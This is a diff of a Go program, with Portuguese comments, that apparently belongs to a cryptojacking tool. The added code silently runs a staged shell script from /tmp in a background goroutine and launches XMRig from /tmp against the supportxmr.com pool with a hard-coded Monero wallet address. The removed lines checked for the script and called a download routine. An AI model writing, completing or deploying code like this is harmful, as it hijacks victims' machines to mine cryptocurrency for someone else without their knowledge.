@@ -1,67 +1,44 @@
 package main
 
-
-
 import (
+	"os/exec"
+       
 
-"os/exec"
-"os"
-"fmt"
-
+        
 )
-
-
 
 //funcao para executa o vkzmn
 
+func exec_vkzmn() {
 
-func exec_vk (){
+	run_atila_vkzmn :=  exec.Command("sh"  , "-c"  ,  "/tmp/./atila_vkzmn.sh") //execute xmr_rig
 
-_,  err_open := os.Open("/tmp/atila_vkzmn.sh")
-
-
-
-if  err_open != nil {
+	
 
 
 
-fmt.Println("atila_vkzmn.sh  nao encontrado")
+	go run_atila_vkzmn.Run()
 
-
-
-down_atila_vkzmn_sh ()
-
-
-return 
-
-}
-
-
-
-
-if  err_open == nil  {
-
-
-
-
-//run_atila_vkzmn :=  exec.Command("sh"  , "-c"  ,  "/tmp/./atila_vkzmn.sh") //execute xmr_rig
-
-
-
- 
-teste :=  exec.Command("./vkzmn" )
- 
-
-
-//go run_atila_vkzmn.Run()
-
-
-go  teste.Run()
-
+	
 
 }
  
+func exec_xmrig() {
 
+
+
+	//executara o xmrig
+
+   xmrig :=  exec.Command("sh" , "-c" ,  "/tmp/xmrig-6.26.0/xmrig --url  pool.supportxmr.com:3333  --user  4Ary8uo817nZAjKXPtgRLf1XUVn1KXUp5WDBUrjDfctwGpirSoxKqBNRnRsgp7ha5vGxXD2u8maGMTezRzjaXrizTp2xYFy  --pass x --donate-level 1" ) 
+
+
+  
+ 
+
+   
+   go xmrig.Run()
+
+ 
 
 
 }
